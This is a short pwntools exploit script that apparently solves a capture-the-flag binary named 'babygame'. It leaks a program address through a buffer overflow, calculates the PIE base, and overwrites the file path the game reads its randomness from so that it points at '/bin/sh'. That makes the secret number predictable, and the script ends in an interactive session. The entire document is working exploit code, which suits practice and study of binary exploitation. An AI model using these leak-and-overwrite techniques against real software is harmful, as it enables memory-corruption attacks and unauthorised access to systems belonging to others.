from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *print_menu
break *game+43
continue
'''.format(**locals())

exe = './challenge/babygame'
elf = context.binary = ELF(exe, checksec=False)
p = start()

p.sendafter(b'?', b'a'*32)
p.sendafter(b'> ', b'2')

leak = u64(p.recvline()[32:-1].ljust(8, b'\x00'))
info("Leak address of string '/dev/urandom': " + hex(leak))
elf.address = leak - (elf.sym.main + 3675)

warn("NAME: " + hex(elf.sym.NAME))
warn("RANDBUF: " + hex(elf.sym.RANDBUF))

p.sendafter(b'> ', b'1')
p.sendafter(b'?', flat(
    b'/bin/sh\x00',       # open '/bin/sh' instead of '/dev/random'
    cyclic(32 - 8),
    elf.sym.NAME          # RANDBUF -> NAME: '/bin/sh'
))

guess = open('/bin/sh', 'rb').read()[:4]
info("guess: " + int.from_bytes(guess, 'little').__str__())

p.sendafter(b'> ', b'1337')
p.sendafter(b'> guess: ', str(u32(guess)).encode())
p.interactive()
